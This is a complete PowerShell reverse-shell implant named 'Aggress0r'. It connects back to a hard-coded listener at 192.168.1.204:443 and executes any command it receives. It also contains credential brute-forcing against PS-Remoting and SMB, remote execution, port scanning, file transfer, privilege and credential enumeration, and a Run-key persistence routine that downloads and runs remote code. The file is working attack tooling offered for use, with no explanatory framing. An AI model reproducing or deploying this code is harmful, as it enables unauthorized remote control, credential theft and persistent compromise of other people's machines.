$global:jobs = @{} 

function upload($src, $dst)
{
    $client = new-object System.Net.WebClient;
    try{$client.UploadFile($dst,$src);return ("[>] uploaded to " + $dst + "`n")}
    catch{return "[>] could not upload file"}
}

function download($url, $dst)
{
    $client = new-object System.Net.WebClient;
    try{$client.DownloadFile($src,$dst);return ("[>] downloaded to " + $dst + "`n")}
    catch{return "[>] could not download file"}
}

function psrmbrute($rh,$us,$ps)
{
    $ErrorActionPreference = 'silentlycontinue';
    $valid = @();
    foreach ($a in $us.split(","))
    {
        foreach ($b in $ps.split(","))
        {
            $secstring = ConvertTo-SecureString $b -AsPlainText -Force;
            $credential = New-Object System.Management.Automation.PSCredential($a, $secstring);
            try{$session = new-pssession -ComputerName $rh -Credential $credential}catch{continue}
            try
            {
                $exec = invoke-command -Session $session {echo $true};
                if ($exec -eq $true){$valid += $($a + ":" + $b);Remove-PSSession $session}
                else{continue}
            }catch{continue}
        }
    }
    if ($valid.length -eq 0){return "[>] no valid credentials found"}
    else{$v = $($valid -join "`n" + "`n");return $("[>] the following valid credentials were found:`n" + $v)}
}

function smbbrute($rshare,$us,$ps)
{
    $ErrorActionPreference = 'silentlycontinue';
    $valid = @();
    foreach ($a in $us.split(","))
    {
        foreach ($b in $ps.split(","))
        {
            $secstring = ConvertTo-SecureString $b -AsPlainText -Force;
            $credential = New-Object System.Management.Automation.PSCredential($a, $secstring);
            try
            {
                new-psdrive -name "aggressor"-PSProvider filesystem -root $rshare -Credential $credential;
                if(($(Get-PSDrive).name).Contains("aggressor")){Remove-PSDrive -name "aggressor";$valid += $($a + ":" + $b)}
                else{continue}
            }catch{continue}
        }
    }
    if ($valid.length -eq 0){return "[>] no valid credentials found"}
    else{$v = $($valid -join "`n" + "`n");return $("[>] the following valid credentials were found:`n" + $v)}
}

function psrmexec($command,$us,$ps,$rh)
{
    $secstring = ConvertTo-SecureString $ps -AsPlainText -Force;
    $credential = New-Object System.Management.Automation.PSCredential($us, $secstring);
    try{$session = new-pssession -ComputerName $rh -Credential $credential}catch{continue}
    try
    {
        $cmd = "invoke-command -Session `$session {iex " + $command + "}";
        $exec = ($(iex $cmd) -join "`n" + "`n");
        Remove-PSSession $session;
        return $("[>] command executed with the following output:`n" + $exec)
    }catch{continue}
}

function portscan($rhst,$brt)
{
    $rhst = $rhst.replace(" ","");
    $brt = $brt.replace(" ","");
    $borts = @();
    $rhost = @();
    if ($brt.contains(","))
    {
        $borts = $brt.split(",");
    }
    elseif ($brt.contains("-"))
    {
        $trb = $brt.split("-");
        foreach ($ib in [int]$trb[0]..[int]$trb[1])
        {
            $borts += $ib;
        }
    }
    else
    {
        $borts = $brt.split(" ");
    }

    if ($rhst.contains(","))
    {
        $rhost = $rhst.split(",");
    }
    elseif ($rhst.contains("-"))
    {
        $kr = $rhst.split("-")[0];
        $kv = $rhst.split("-")[1];
        $ki = $kr.split(".")[-1];
        $ka = $kv.split(".")[-1];
        $km = $kr.split(".")[0..2];
        $kl = ($km -join [char]46) + [char]46;
        foreach($i in $ki..$ka)
        {
            $rhost += $kl + $i.tostring();
        }
    }
    else
    {
        $rhost = $rhst;
    };
    $bh = @();
    foreach ($bt in $borts)
    {
        $ErrorActionPreference= 'silentlycontinue';
        foreach ($a in $rhost)
        {
            $bc = new-object System.Net.Sockets.TcpClient;
            $bs = $bc.BeginConnect($a,$bt,$null,$null);
            $bg = $bs.AsyncWaitHandle.WaitOne(1,$false);
            if ($bg -eq $false)
            {
                continue;
            }
            else
            {
                try
                {
                    $bc.EndConnect($bs);
                    $sk = ($a + ":" + $bt.tostring());
                    $bh += ($sk);
                }
                catch{continue}
            }
        }
    }
    if ($bh.length -eq 0){return "[>] no open ports found on supplied hosts"}else{return $("[>] the following open ports were found:`n" + ($bh -join "`n" + "`n"))}
}

function persist($url)
{
    $persistpath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run";
    Set-ItemProperty -Path $persistpath -Name "protector" -value $("cmd.exe /k powershell.exe -w 1 iex (new-object system.net.webclient).downloadstring('" + $url + "')");
    return "[>] Persisted in HKCU Run key`n";
}

function runelevated($command,$user,$password)
{
    $secstring = ConvertTo-SecureString $password -AsPlainText -Force;
    $credential = New-Object System.Management.Automation.PSCredential($user, $secstring);   
    try{$invocation = [system.diagnostics.process]::start("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",$command,$credential.UserName,$credential.Password,$(hostname));return $invocation}
    catch{return "[>] could not run elevated`n"}
}

function countermeasures()
{
    $sessions = @();
    $erroractionpreference = 'silentlycontinue';
    $igproperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties();
    $active_connections = $igproperties.getactivetcpconnections();
    $pssession = Get-PSSession;
    $rdpsession = @();
    foreach ($e in $active_connections)
    {
        if ($($e.LocalEndPoint.port -eq 3389)){$rdpsession += ($e.RemoteEndPoint.address).tostring()}else{continue}
    }
    try{$netsessions = net sessions;$sessions += $netsessions}catch{$sessions += "[>] could not list hosts connected via smb"}
    if ($pssession -eq $null){$sessions += "[>] no active pssessions"}else{$sessions += $pssession}
    if ($rdpsession.length -eq 0){$sessions += "[>] no active rdpsessions"}else{foreach ($s in $rdpsession){$sessions += $("rdp session client : " + $s)}}
    $sj = $($sessions -join "`n" + "`n");
    return $sj;
}

function filesearch($method,$search,$dir)
{
    $gcir = (gci -r $dir).FullName;
 
    $files = @();
    if ($method -eq "name")
    {
        foreach ($fl in $gcir)
        {
            if ($($fl).tolower().contains($search.tolower()))
            {
                $files += ($fl)
            }
        }
    }
    elseif ($method -eq "content")
    {
        foreach ($fl in $gcir)
        {
            if ($(get-content $fl).tolower().contains($search.tolower()))
            {
                $files += ($fl)
            }
        }
    }
    elseif ($method -eq "owner")
    {
        foreach ($fl in $gcir)
        {
            if (($(get-acl $fl).owner).tolower().Contains($search.tolower()))
            {
                $files += ($fl)
            }
        }
    }
    if ($files.Count -eq 0)
    {
        $files += ("[>] no matches`n")
    }
    return $($files -join "[\n]")
}

function privchecker($acl)
{
    $privs = @();
    $privs += $(get-process | out-string);
    $privs += $(netstat -ano);
    $privs += $(net users);
    $privs += $(net localgroup administrators);
    $privs += $(cmdkey.exe /list);
    $privs += $((get-acl $acl).Access | out-string);
    return $($privs -join "`n");
}

function cmdparse($data)
{
    $spdata = $data.split(" ");
	$cmd = $spdata[0];
	$args = @{};
    $key = $null;
	foreach ($x in $spdata[1..$($spdata.length - 1)])
    {
        if ($x.contains("=")){$esp = $x.split("=");$key = $esp[0];$args.add($esp[0],$esp[1])}
        else{$args.$key += $(" " + $x)}
    }
	if ($cmd -eq "upload"){$ret = upload $args["source"] $args["destination"]}
	elseif ($cmd -eq "download"){$ret = download $args["source"] $args["destination"]}
	elseif ($cmd -eq "psrmbrute"){$ret = psrmbrute $args["rhost"] $args["users"] $args["passwords"]}
	elseif ($cmd -eq "smbbrute"){$ret = smbbrute $args["share"] $args["users"] $args["passwords"]}
	elseif ($cmd -eq "psrmexec"){$ret = psrmexec $args["command"] $args["username"] $args["password"] $args["rhost"]}
    elseif ($cmd -eq "privchecker"){$ret = privchecker $args["acl"]}
	elseif ($cmd -eq "countermeasures"){$ret = countermeasures}
	elseif ($cmd -eq "portscan"){$ret = portscan $args["host"] $args["port"]}
	elseif ($cmd -eq "persist"){$ret = persist $args["url"]}
	elseif ($cmd -eq "runelevated"){$ret = runelevated $args["command"] $args["user"] $args["password"]}
	elseif ($cmd -eq "filesearch"){$ret = filesearch $args["method"] $args["search"] $args["dir"]}
	return $ret
}

$embedded_commands = @{"help"="print this message";"upload"="upload file to http POST upload server";"download"="download file from http listener";"psrmbrute"="brute force psremoting";"smbbrute"="test credentials against smb share";"psrmexec"="execute command via psrmexec (credentialed)";"countermeasures"="list remote sessions";"portscan"="connect scan and ping sweep";"persist"="install Aggress0r";"runelevated"="run command as superuser (runs as job)";"filesearch"="search for files";"privchecker"="look for possible elevation mechanisms"}
$cmd_help = @{"upload"="usage : upload source=<source file> destination=<destination http url>`n";"download"="usage : download source=<source url> destination=<file absolute path>`n";"psrmbrute"="usage : psrmbrute rhost=<remote ip> users=<comma-separated list of users> passwords=<comma-separated list of passwords>`n[>] WARNING: please verify account lockout settings before running large lists of usernames and passwords`n";"smbbrute"="usage : smbbrute share=<full unc path to share> users=<comma-separated list of users> passwords=<comma-separated list of passwords>`n[>] WARNING: please verify account lockout settings before running large lists of usernames and passwords`n";"psrmexec"="usage : psrmexec command=<shell command to run> username=<user to authenticate as> password=<password for user> rhost=<remote ip>`n";"countermeasures"="usage : countermeasures`n";"portscan"="usage : portscan host=<','-separated list or '-'-separated range> port=<','-separated list or '-'-separated range>`n";"persist"="usage : persist url=<full url hosting payload>`n";"runelevated"="usage : runelevated command=<command to run> user=<user to runas> password=<password of user>`n";"filesearch"="usage : filesearch method=<content / name / owner> search=<string to search for> dir=<top dir to recurse>`n";"privchecker"="usage : privchecker acl=<file to check acl on>`n"}
$lh = "192.168.1.204"
$lp = 443

$cn = [environment]::ExpandEnvironmentVariables("%COMPUTERNAME%");
$ic = @"

        /\               /\
        \ \             / /
         \ \           / /    
         /\ \         / /\     
         \ \ \       / / /
         /\ \ \     / / /\
         \ \ \ \   / / / /
         /\ \  /   \  / /\
         \ \  /     \  / /
          \ \ \ .". / / /
           \   \/V\/   /
            \         / 
             \   @   /        
              \  |  / 
              =))=((=
               /|V|\    
              / ||| \
              \/|||\/
               \|||/
    [si vis pacem, para bellum]

                                                       
[>] Aggress0r for Windows, Version 1.0`n
"@;
$ih = ("[>] Hostname: " + [environment]::ExpandEnvironmentVariables("%COMPUTERNAME%") + "`n");
$ix = ("[>] System: " + $(gwmi win32_operatingsystem).version + "`n");
$ik = @"
[>] Type 'help' for a list of embedded commands or run a shell command
[>] Type 'exit' or 'quit' to close shell`n`n
"@
$im = ($ic + $ih + $ix + $ik)
$ci = [system.text.encoding]::ASCII.GetBytes($im);
$es = New-Object System.Net.Sockets.TcpClient;
$es.Connect($lh, $lp);
$ts = $es.GetStream();
$writer = New-Object System.IO.StreamWriter($ts);
$writer.AutoFlush = $true;
$writer.Write($ci, 0, $ci.length);
$buf = new-object System.Byte[] 1024;
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
$encoding = new-object System.Text.ASCIIEncoding
if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true)
{
    $prompt = "Aggress0r-> "
}
else
{
    $prompt = "Aggress0r~# "
}
$writer.write($prompt)


while ($es.Connected)
{
    while ($ts.DataAvailable)
    {
        $tts = $ts.read($buf, 0, 1024);
        $re = $encoding.GetString($buf[0..($tts - 2)]);
        $cmdchk = $re.split(" ")[0]
        if ($re.contains("quit") -or $re.Contains("exit"))
        {
            exit;
        }
        elseif ($re.contains("help"))
        {
            $writer.write("[>] Aggress0r command list`n")
            $writer.write("[>] Type '<command> usage' for help message`n")
            foreach ($embed in $embedded_commands.keys)
            {
                $cmd = ("    {>} " + $embed + " : " + $embedded_commands[$embed] + "`n")
                $writer.write($cmd)
            }
        }
        elseif ($embedded_commands.ContainsKey($cmdchk))
        {
            if ($re.ToLower().Contains("usage"))
            {
                $ret_data = ("[>] " + $cmd_help[$cmdchk])
            }
            else
            {
                $ret_data = cmdparse $re
            }
            $writer.write($ret_data + "`n")
        }
        else
        {
            $shout = Invoke-Expression $re;
            foreach ($st in $shout)
            {
                $sk = $st | out-string;
                $writer.Write($sk)
            }
        }
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()); 
        if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true)
        {
            $prompt = "Aggress0r-> ";
        }
        else
        {
            $prompt = "Aggress0r~# ";
        }
        $writer.write($prompt); 
    }
    start-sleep -Milliseconds 500
}
$writer.Close()
